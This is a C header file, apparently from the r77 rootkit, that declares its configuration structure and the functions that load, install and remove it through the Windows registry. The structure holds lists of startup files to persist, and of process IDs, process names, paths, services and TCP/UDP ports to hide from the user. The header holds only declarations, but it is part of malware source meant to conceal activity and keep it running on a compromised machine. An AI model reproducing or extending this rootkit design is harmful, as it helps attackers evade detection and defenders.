#include "r77mindef.h"
#include "clist.h"
#ifndef _R77CONFIG_H
#define _R77CONFIG_H

/// <summary>
/// Defines the global configuration for r77.
/// </summary>
typedef struct _R77_CONFIG
{
	/// <summary>
	/// A list of file paths to start when windows starts.
	/// </summary>
	PSTRING_LIST StartupFiles;
	/// <summary>
	/// A list of process ID's to hide in addition to processes hidden by the prefix.
	/// </summary>
	PINTEGER_LIST HiddenProcessIds;
	/// <summary>
	/// A list of process names to hide in addition to processes hidden by the prefix.
	/// </summary>
	PSTRING_LIST HiddenProcessNames;
	/// <summary>
	/// A list of file or directory full paths to hide in addition to files and directories hidden by the prefix.
	/// </summary>
	PSTRING_LIST HiddenPaths;
	/// <summary>
	/// A list of service names to hide in addition to services hidden by the prefix.
	/// </summary>
	PSTRING_LIST HiddenServiceNames;
	/// <summary>
	/// A list of local TCP ports to hide.
	/// </summary>
	PINTEGER_LIST HiddenTcpLocalPorts;
	/// <summary>
	/// A list of remote TCP ports to hide.
	/// </summary>
	PINTEGER_LIST HiddenTcpRemotePorts;
	/// <summary>
	/// A list of UDP ports to hide.
	/// </summary>
	PINTEGER_LIST HiddenUdpPorts;
} R77_CONFIG, *PR77_CONFIG;

/// <summary>
/// Loads the global configuration for r77.
/// </summary>
/// <returns>
/// A newly allocated R77_CONFIG structure.
/// </returns>
PR77_CONFIG LoadR77Config();
/// <summary>
/// Deletes the specified R77_CONFIG structure.
/// </summary>
/// <param name="config">The R77_CONFIG structure to delete.</param>
VOID DeleteR77Config(PR77_CONFIG config);
/// <summary>
/// Compares two R77_CONFIG structures for equality.
/// </summary>
/// <param name="configA">The first R77_CONFIG structure.</param>
/// <param name="configB">The second R77_CONFIG structure.</param>
/// <returns>
/// TRUE, if both R77_CONFIG structures are equal;
/// otherwise, FALSE.
/// </returns>
BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB);
/// <summary>
/// Creates the r77 configuration registry key with full access to all users.
/// </summary>
/// <param name="key">The newly created HKEY.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL InstallR77Config(PHKEY key);
/// <summary>
/// Deletes the r77 configuration from the registry.
/// </summary>
VOID UninstallR77Config();

#endif